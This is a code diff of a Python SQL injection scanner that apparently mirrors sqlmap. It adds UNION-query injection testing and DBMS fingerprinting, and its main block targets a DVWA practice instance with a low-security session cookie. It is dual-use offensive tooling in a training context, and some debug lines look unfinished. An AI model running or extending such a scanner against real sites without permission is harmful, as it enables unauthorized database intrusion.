@@ -1,11 +1,12 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 # DateTime    : 2019-07-17 21:51:57
-# Author  : dongchuan
+# Author  : dongchuan 250212415
 # Version : v1.0
 # Desc     : 
 import os
 import re
+import sys
 import copy
 import urlparse
 from lib.config import conf
@@ -13,10 +14,13 @@ from lib.config import kb
 from lib.data import AttribDict
 from xml.etree import ElementTree as et
 from xml.sax.handler import ContentHandler
+from thirdparty import six
 from lib.utils.Agent import agent
 from lib.utils.common import randomStr
 from lib.utils.common import cleanupVals
 from lib.utils.common import parseXmlFile
+from lib.techniques.union.test import unionTest
+from lib.techniques.union.use import configUnion
 from lib.request.queryPage import proxyqueryPage
 from lib.utils.common import readCachedFileContent
 from lib.utils.common import urlencode, getUnicode,setCookie
@@ -25,8 +29,15 @@ from lib.utils.common import extractTextTagContent, InjectionDict, intersect
 from lib.utils.checks import checkDynParam, checkDynParam_t, HTTPCheck, checkTimeBasedCompare
 from lib.utils.enums import PLACE, SORT_ORDER, CUSTOM_INJECTION_MARK_CHAR, DEFAULT_GET_POST_DELIMITER
 from lib.utils.enums import URI_QUESTION_MARKER, HEURISTIC_CHECK_ALPHABET, TECHNIQUE, WHERE, PAYLOAD, SLEEP_TIME_MARKER
+from lib.utils.enums import KB_CHARS_BOUNDARY_CHAR, KB_CHARS_LOW_FREQUENCY_ALPHABET
 
 
+def _setKnowledgeBaseAttributes():
+    kb.chars = AttribDict()
+    kb.chars.delimiter = randomStr(length=6, lowercase=True)
+    kb.chars.start = "%s%s%s" % (KB_CHARS_BOUNDARY_CHAR, randomStr(length=3, alphabet=KB_CHARS_LOW_FREQUENCY_ALPHABET), KB_CHARS_BOUNDARY_CHAR)
+    kb.chars.stop = "%s%s%s" % (KB_CHARS_BOUNDARY_CHAR, randomStr(length=3, alphabet=KB_CHARS_LOW_FREQUENCY_ALPHABET), KB_CHARS_BOUNDARY_CHAR)
+    kb.chars.at, kb.chars.space, kb.chars.dollar, kb.chars.hash_ = ("%s%s%s" % (KB_CHARS_BOUNDARY_CHAR, _, KB_CHARS_BOUNDARY_CHAR) for _ in randomStr(length=4, lowercase=True))
 
 
 class HTMLHandler(ContentHandler):
@@ -198,14 +209,14 @@ def heuristicCheckSqlInjection(place, parameter, paramDict, parameters):
 
 def checkSqlInjection(place, parameter, value, paramDict, parameters, url_test):
 
-    
+    injection = InjectionDict()
     tests_check = getSortedInjectionTests()
     seenPayload = set()
     extendTests = kb.dbms
     reduceTests = kb.dbms
 
     while conf.tests:
-        injection = InjectionDict()
+        
         test = conf.tests.pop(0)
         title = test.title
         clause = test.clause
@@ -387,8 +398,24 @@ def checkSqlInjection(place, parameter, value, paramDict, parameters, url_test):
                                 # print infoMsg
 
                                 injectable = True
+                    # In case of UNION query SQL injection
                     elif method == PAYLOAD.METHOD.UNION:
-                        pass
+                        # Test for UNION injection and set the sample
+                        # payload as well as the vector.
+                        # NOTE: vector is set to  a tuple with 6 elements,
+                        # used afterwards by Agent.forgeUnionQuery()
+                        # method to forge the UNION query payload
+                        configUnion(test.request.char, test.request.columns)
+
+                        # # Test for UNION query SQL injection
+                        reqPayload, vector = unionTest(comment, place, parameter, value, prefix, suffix,paramDict,parameters)
+                        if isinstance(reqPayload, six.string_types):
+
+                            injectable = True
+
+                            # Overwrite 'where' because it can be set
+                            # by unionTest() directly
+                            where = vector[6]
 
 
                 if injectable is True:
@@ -405,36 +432,42 @@ def checkSqlInjection(place, parameter, value, paramDict, parameters, url_test):
                         injection.clause = clause
 
 
-                        if hasattr(test, "details"):
-                            for dKey, dValue in test.details.items():
-                                if dKey == "dbms":
-                                    injection.dbms = dValue
+                    if hasattr(test, "details"):
+                        for dKey, dValue in test.details.items():
+                            if dKey == "dbms":
+                                injection.dbms = dValue
 
-                                elif dKey == "dbms_version" and injection.dbms_version is None:
-                                    injection.dbms_version = Backend.setVersion(dValue)
+                                if not isinstance(dValue, list):
+                                    Backend.setDbms(dValue)
+                                else:
+                                    Backend.forceDbms(dValue[0], True)
 
-                                # elif dKey == "os" and injection.os is None:
-                                #     injection.os = Backend.setOs(dValue)
+                            elif dKey == "dbms_version" and injection.dbms_version is None:
+                                injection.dbms_version = Backend.setVersion(dValue)
+
+                            # elif dKey == "os" and injection.os is None:
+                            #     injection.os = Backend.setOs(dValue)
 
 
-                        if vector is None and "vector" in test and test.vector is not None:
-                            vector = test.vector
+                    if vector is None and "vector" in test and test.vector is not None:
+                        vector = test.vector
 
-                        injection.data[stype] = AttribDict()
-                        injection.data[stype].title = title
-                        injection.data[stype].payload = reqPayload
-                        injection.data[stype].where = where
-                        injection.data[stype].vector = vector
-                        injection.data[stype].comment = comment
-                        injection.data[stype].templatePayload = templatePayload
+                    injection.data[stype] = AttribDict()
+                    injection.data[stype].title = title
+                    injection.data[stype].payload = reqPayload
+                    injection.data[stype].where = where
+                    injection.data[stype].vector = vector
+                    injection.data[stype].comment = comment
+                    injection.data[stype].templatePayload = templatePayload
 
-                        break
+                    break
 
 
             if injectable is True:
+                print injection.data[stype]
                 # break
-                print injectable,injection
-                # break
+    # if injection.data:
+    #     print injection.data
 
 def start(url):
     paramDict = {}
@@ -467,8 +500,8 @@ def start(url):
 
 
 if __name__ == '__main__':
+    _setKnowledgeBaseAttributes()
     Init()
-    # start("http://localhost/test.php?id=1")
     setCookie("PHPSESSID=0cac79e9e449cd52de688c5ef9f8d816; security=low")
     start("http://dvwa.suicao.com/vulnerabilities/sqli/?id=1&Submit=Submit#")
     # print kb
